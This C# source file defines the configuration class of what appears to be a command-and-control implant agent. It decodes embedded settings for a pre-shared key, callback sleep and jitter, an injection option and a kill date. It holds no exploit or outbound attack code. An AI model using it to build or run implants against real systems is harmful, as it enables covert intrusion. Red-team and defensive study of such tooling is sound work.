using Agent.Interfaces;
using System.Text.Json;

namespace Agent.Config
{
    public class AgentConfig : IAgentConfig
    {
        public int chunk_size { get; set; } = 85000;
        public int inject { get; set; } = 2;
        private string? _uuid;
        public string? uuid
        {
            get => _uuid;
            set
            {
                _uuid = value;
                SetAgentConfigUpdated?.Invoke(this, EventArgs.Empty);
            }
        }
        public string build_uuid { get; }
        public bool require_plugin_contract_fingerprint { get; }
        public int sleep { get; set; } = 60;
        public int jitter { get; set; } = 10;
        private string? _psk;
        public string? psk
        {
            get => _psk;
            set
            {
                _psk = value;
                SetAgentConfigUpdated?.Invoke(this, EventArgs.Empty);
            }
        }
        public DateTime killDate { get; set; }
        public bool prettyOutput { get; set; }
        public bool debug { get; set; }

        public AgentConfig()
        {
            prettyOutput = true;
            AgentConfigOptions? opts = null;
            try
            {
                opts = JsonSerializer.Deserialize(
                    AgentConfigData.Decode(),
                    AgentConfigOptionsJsonContext.Default.AgentConfigOptions);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Config Error] Failed to deserialize agent config: {ex.Message}");
            }

            opts ??= new AgentConfigOptions();
            uuid = opts.Uuid;
            build_uuid = opts.Uuid;
            require_plugin_contract_fingerprint = opts.PluginContractFingerprintRequired;
            psk = opts.Psk;
            sleep = opts.CallbackInterval;
            jitter = opts.CallbackJitter;
            killDate = DateTime.TryParse(opts.KillDate, out var parsedKillDate)
                ? parsedKillDate
                : DateTime.Now.AddYears(1);
        }

        public event EventHandler? SetAgentConfigUpdated;
    }
}
